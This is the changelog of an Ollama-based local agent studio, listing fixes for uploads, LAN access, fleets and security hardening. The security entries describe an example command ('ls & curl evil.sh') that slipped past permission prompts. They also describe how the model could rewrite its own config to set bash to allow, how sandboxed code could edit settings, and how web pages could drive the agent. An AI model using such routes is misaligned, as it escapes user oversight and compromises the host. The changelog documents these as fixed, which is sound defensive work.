# Changelog

## Unreleased

### Image attachments

- **Fix:** one damaged, cut-off or mislabelled picture (e.g. an interrupted phone upload) made Ollama answer `400 Failed to load image or audio file` on every later request, because the last 4 images are re-sent each time. Pictures are now checked (signature, PNG/JPEG end marker) when attached and before every send; bad ones fall back to vision-model/OCR/path mode with a note.
- **Fix:** if Ollama still reports it cannot load an image, the turn is retried once without pictures (the model is told) instead of failing.
- **Fix:** an upload that arrives shorter than its `Content-Length` is rejected instead of stored.

### LAN / proxy access

- **Fix:** uploads (and other API calls) from a browser on another device of the LAN, or through a proxy/tunnel, were refused as "cross-site" when `Origin`, `Host` or `Sec-Fetch-Site` did not line up. The UI now sends `X-Studio-Client: web` on every same-origin request (`public/net.js`); the guard treats it as proof of a same-origin script (browser-enforced via CORS preflight), while the token, Host and JSON-only rules stay in force.
- **New:** `--allow-origin URL` / `OLLAMA_STUDIO_ALLOWED_ORIGINS` for clients without that header behind a proxy; `X-Forwarded-Host` is honoured; the 403 message names the Origin/Host pair. `/api/shutdown` uses the same rule.

### Security hardening (round 2)

- **Fix (critical):** a single `&` was not treated as a command separator, so `ls & curl evil.sh` ran without asking. The splitter is now quote-aware and fails safe (unterminated quotes, `$'…'`, substitutions, redirects always ask).
- **Fix (critical):** the model could rewrite `<studio dir>/config.json` through the virtual `.studio/` path (default `edit: allow`) and set `bash: allow`. New `lib/protect.js` blocks the studio config/hooks/plugins/history, `<project>/.studio|.claude|.agents/plugins` and everything under `.git` for the file tools (symlinks resolved).
- **Fix:** `git status/diff/log` were auto-allowed although `core.fsmonitor`, `diff.external`, textconv and filter drivers in `.git/config` execute programs. `lib/gitsafe.js` downgrades git commands to *ask* while such config is present.
- **Fix (critical):** the Docker sandbox mounted the studio folder read-write, letting sandboxed code edit `config.json`. It is now opt-in (`mountStudio`, read-only); `.git/config`, `.git/hooks` and plugin folders are read-only inside the container.
- **Change:** sandbox drops all capabilities (`capDrop`) and runs as the calling user on POSIX hosts (no root-owned files); a successful Docker check is cached for 60 s.
- **Fix:** a malformed cookie made the request guard throw and the request hang. Cookie parsing is safe and a guard failure answers 400.
- **Change:** "always allow" for interpreters/wrappers (`node`, `python`, `env`, `find`, `xargs`, `sed` …) and risky subcommands (`git push`, `docker run`, `npm run` …) now remembers the exact command only (literal grant, never a glob).

### Fleets

- **Fix:** a handoff to a busy agent was silently lost. It is now parked in the member's `pending` list (persisted, max 20) and delivered merged when that agent finishes.
- **Fix:** aborting a run no longer triggers `on: any` links (`any` = done or failed); new `on: aborted` link type. An aborted member's parked handoffs are discarded with a visible `lastError`.
- **New:** `fleet.maxChainRuns` (default 12): at most that many model runs per dispatched task, whatever the link graph looks like.
- **New:** path claims between agents running at the same time (`lib/locks.js`): the first agent that changes a file owns it until its run ends. Without per-agent git worktrees this prevents silent overwrites.
- **Fix:** a damaged `fleets.json` is copied to `fleets.json.broken` instead of being overwritten by the next save.
- UI: handoff condition `when done or failed` / `when aborted`; member cards show waiting handoffs.

- **New:** skills are auto-shortlisted by relevance, with `skills.auto` controls and frontmatter `auto: false`; hidden extended skills can be loaded from disk via `skills.remotesPath` or embedded with `--with-remotes`, and local names win.
- **New:** the message menu has a **Select text** action for touch devices, enabling native selection/copy of one message without suppressing the long-press menu elsewhere.
- **New:** bundled operational agents and skills are available by default with scoped delegation rules.
- **New:** `http_request` supports opt-in request/header details, full bodies as text or base64, workspace-contained `save_to`, binary request bodies, and redirects with host/private-address rechecks.
- **New:** `--remote-max-mb` and `--remote-file-max-kb` cap how much remote-skill content is embedded in the single binary.
- **Fix:** edit tools reject whole-file literal `\n` blobs; workspace path resolution blocks symlink escapes while allowing an explicit opt-in.
- **Change:** shell commands (`bash`) now ask for permission by default. Only `pwd`, `ls …`, `git status …`, `git branch` and `node --version` run without a prompt. Compound commands ask if any part asks.
- **Change:** startup prints a notice when the Docker sandbox is off.
- **Refactor:** `handleApi` sessions and upload/permission/abort routes moved into `handleSessionsApi` and `handleRunControlApi`; the file-changing tools moved into `executeFileEditTool`; the subagent closure in `runAgentCore` moved into `runSubagentTask`. Behaviour is unchanged and covered by the existing tests.
- **Refactor:** `public/app.js` is split into `app.js`, `app-chat.js`, `app-dialogs.js` and `app-wiring.js`, loaded in the same order.
- **New:** `npm run lint` (zero dependencies) checks for unescaped `innerHTML` interpolation and `eval`/`new Function`; it runs in CI.
- **Docs:** README version and Node requirements corrected; SECURITY notes the Windows limit on `config.json` permissions.

## 1.1.0 - security hardening

- **Fix (critical):** the HTTP API accepted cross-site and DNS-rebinding requests, so any web page could change the config (e.g. `bash: allow`, MCP commands) and drive the agent. New `lib/guard.js`: Host allow-list, Origin / Sec-Fetch-Site checks, JSON-only writes, and a required access token for non-loopback binds.
- **New:** project trust (`lib/trust.js`, `--trust`, `POST /api/trust`, boot prompt). Plugins inside the project and the project's `node_modules/.bin` (LSP) only run in trusted projects.
- **New:** secrets are removed from the environment of agent-run commands and command plugins (`lib/env.js`, `bashEnv` config).
- **Fix:** `webfetch` SSRF: DNS resolution check, manual redirect handling, IPv4-mapped IPv6 / CGNAT / link-local coverage, `webfetch.allowPrivate` opt-in.
- **Fix:** default permission rules no longer auto-allow `git diff|log` with `--output`, `--ext-diff`, `--textconv`, `-c`.
- **Fix:** `config.json` written atomically with mode `0600`; data directories `0700`.
- **Fix:** JSON request bodies limited to 8 MB (chat 32 MB, file save 64 MB) instead of 100 MB.
- Security headers on every response (`X-Frame-Options`, `frame-ancestors`, `nosniff`, `Referrer-Policy`).
- Startup note when Node < 22.5 disables long-term memory; the `node:sqlite` ExperimentalWarning is hidden.
- CI: tests on push to main/master and PRs; 100 MB binaries only for tags / manual runs; least-privilege token (write access only in the release job); actions pinned to commit SHAs.
- 27 new tests (guard, env filtering, SSRF, trust, live-server attack scenarios).
- Docs: README "Security model", `SECURITY.md`.
